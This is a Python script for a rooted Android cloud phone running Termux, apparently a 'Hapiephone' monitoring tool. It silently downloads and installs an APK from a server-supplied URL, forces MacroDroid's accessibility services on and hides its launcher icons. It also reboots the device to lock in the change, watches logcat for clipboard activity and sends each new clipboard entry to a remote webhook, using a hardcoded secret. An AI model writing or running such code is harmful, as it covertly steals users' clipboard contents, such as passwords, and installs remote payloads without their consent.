import sys
import time
import subprocess
import requests
import os

# --- CONFIGURAÇÕES INICIAIS ---
if len(sys.argv) < 4:
    print(f"❌ [FATAL ERROR] Insufficient arguments to start! Received: {sys.argv}", flush=True)
    sys.exit(1)

DEVICE_ID = sys.argv[1]
GUILD_ID = sys.argv[2]
OWNER_ID = sys.argv[3]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
HEADERS = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}
APP_PACKAGE = "com.arlosoft.macrodroid"

# Arquivo de controle para não ficar reiniciando o celular em loop
FLAG_SETUP = "/sdcard/.hapie_macro_setup"

# Garante que o Termux não durma
subprocess.run("termux-wake-lock", shell=True, check=False)

def is_app_installed():
    try:
        res = subprocess.check_output(f'su -c "dumpsys package {APP_PACKAGE} | grep versionName"', shell=True, text=True).strip()
        return "versionName" in res
    except Exception:
        return False

def setup_macrodroid():
    if os.path.exists(FLAG_SETUP):
        print("✅ [SETUP] Acessibilidade já foi configurada e burlada anteriormente.", flush=True)
        
        # Etapa final: Ocultar o ícone apenas se a acessibilidade já estiver 100% fixada
        try:
            fallbacks = [
                "com.arlosoft.macrodroid.LauncherActivity",
                "com.arlosoft.macrodroid.MainActivity",
                "com.arlosoft.macrodroid.intro.SplashActivity",
                "com.arlosoft.macrodroid.intro.IntroActivity"
            ]
            for act in fallbacks:
                subprocess.run(f'su -c "pm disable com.arlosoft.macrodroid/{act}"', shell=True, stderr=subprocess.DEVNULL)
        except Exception:
            pass
        return

    print("⚙️ [SETUP] Injetando Acessibilidade no Banco de Dados...", flush=True)
    
    service_main = "com.arlosoft.macrodroid/com.arlosoft.macrodroid.MacroDroidAccessibilityService"
    service_ui = "com.arlosoft.macrodroid/com.arlosoft.macrodroid.triggers.services.UIInteractionService"
    macrodroid_services = f"{service_main}:{service_ui}"

    subprocess.run('su -c "appops set com.arlosoft.macrodroid ACCESS_RESTRICTED_SETTINGS allow"', shell=True, stderr=subprocess.DEVNULL)
    subprocess.run('su -c "monkey -p com.arlosoft.macrodroid -c android.intent.category.LAUNCHER 1"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1.5)

    commands_perms = [
        'su -c "pm grant com.arlosoft.macrodroid android.permission.WRITE_EXTERNAL_STORAGE"',
        'su -c "pm grant com.arlosoft.macrodroid android.permission.READ_EXTERNAL_STORAGE"',
        'su -c "appops set com.arlosoft.macrodroid SYSTEM_ALERT_WINDOW allow"',
        'su -c "dumpsys deviceidle whitelist +com.arlosoft.macrodroid"'
    ]
    for cmd in commands_perms:
        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
    
    try:
        subprocess.run("su -c 'settings put secure accessibility_enabled 1'", shell=True)
        time.sleep(0.5)
        cmd_inject = f"su -c 'settings put secure enabled_accessibility_services {macrodroid_services}'"
        subprocess.run(cmd_inject, shell=True)
        time.sleep(0.5)
        
        # Cria o arquivo de flag para avisar que a injeção já foi feita
        subprocess.run(f"touch {FLAG_SETUP}", shell=True)
        
        print("🚀 [BYPASS] ROM do UGPhone detectada. Bloqueio visual ativo.", flush=True)
        print("🔄 [BYPASS] O sistema será REINICIADO em 3 segundos para fixar a permissão na marra...", flush=True)
        time.sleep(3)
        
        # Força o reboot do cloud phone. Na volta, a acessibilidade já vai ligar sozinha.
        subprocess.run('su -c "reboot"', shell=True)
        sys.exit(0)
        
    except Exception as e:
        print(f"❌ Erro ao forçar acessibilidade: {e}", flush=True)

def download_and_install(url):
    apk_path = "/sdcard/sys_app_temp.apk"
    try:
        print(f"🔗 [DOWNLOAD] Recebendo link...", flush=True)
        
        if "drive.google.com" in url or "docs.google.com" in url:
            res_dl = subprocess.run(f'gdown "{url}" -O {apk_path}', shell=True, stdout=subprocess.DEVNULL)
            if res_dl.returncode != 0:
                return False
        else:
            response = requests.get(url, stream=True, timeout=60)
            response.raise_for_status()
            with open(apk_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk: 
                        f.write(chunk)
        
        if not os.path.exists(apk_path):
             return False

        size_mb = os.path.getsize(apk_path) / (1024 * 1024)
        print(f"📦 [DOWNLOAD] Salvo. Tamanho: {size_mb:.2f} MB", flush=True)
        
        if size_mb < 2.0:
            os.remove(apk_path)
            return False

        print("⚙️ [INSTALL] Instalando silenciosamente...", flush=True)
        res = subprocess.run(f'su -c "pm install -r {apk_path}"', shell=True, capture_output=True, text=True)
        
        if os.path.exists(apk_path):
            os.remove(apk_path)
            
        return "Success" in res.stdout
    except Exception:
        if os.path.exists(apk_path):
            os.remove(apk_path)
        return False

def force_focus_and_read():
    try:
        subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity" 2>/dev/null', shell=True)
        time.sleep(0.4)
        text = subprocess.check_output("termux-clipboard-get", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
        subprocess.run('su -c "input keyevent 4" 2>/dev/null', shell=True)
        return text if text and text != "null" else ""
    except Exception:
        return ""

def check_authorization():
    try:
        installed = is_app_installed()
        
        payload = {
            "ping": True,
            "device_id": DEVICE_ID,
            "guild_id": GUILD_ID,
            "owner_id": OWNER_ID,
            "app_system": not installed,
            "report": {
                "system_info": {
                    "model": "Hapiephone Guard",
                    "root_access": True,
                    "device_id": DEVICE_ID
                }
            }
        }
        response = requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            
            if not installed:
                if "system_apk_url" in data:
                    if download_and_install(data["system_apk_url"]):
                        setup_macrodroid()
                        installed = True
            else:
                setup_macrodroid()
                    
            return data.get("status") == "active" and installed
        return False
    except Exception:
        return False

def start_vigilante():
    print(f"👁️ [WATCHER] Monitorando Guild: {GUILD_ID}...", flush=True)
    last_clip = force_focus_and_read()
    
    subprocess.run('su -c "logcat -c" 2>/dev/null', shell=True)
    cmd_watcher = 'su -c "logcat | grep -Ei \'clipboard|PrimaryClip|focus\'"'
    process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    while True:
        line = process.stdout.readline()
        if line:
            time.sleep(0.5)
            current = force_focus_and_read()
            
            if current and current != last_clip:
                if not is_app_installed():
                    process.terminate()
                    return

                try:
                    payload = {
                        "texto": current, 
                        "device_id": DEVICE_ID, 
                        "guild_id": GUILD_ID,
                        "owner_id": OWNER_ID
                    }
                    res = requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=5)
                    
                    if res.status_code == 200:
                        data = res.json()
                        if data.get("status") == "shutdown":
                            process.terminate()
                            return
                            
                    last_clip = current
                except Exception:
                    process.terminate()
                    return

        if process.poll() is not None:
            process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def main():
    print("📡 Hapiephone System Online...", flush=True)
    
    if is_app_installed():
        setup_macrodroid()

    while True:
        if check_authorization():
            start_vigilante()
        else:
            print("😴 [WAITING] Re-autorizando em 5 min...", flush=True)
            time.sleep(300) 

if __name__ == "__main__":
    main()
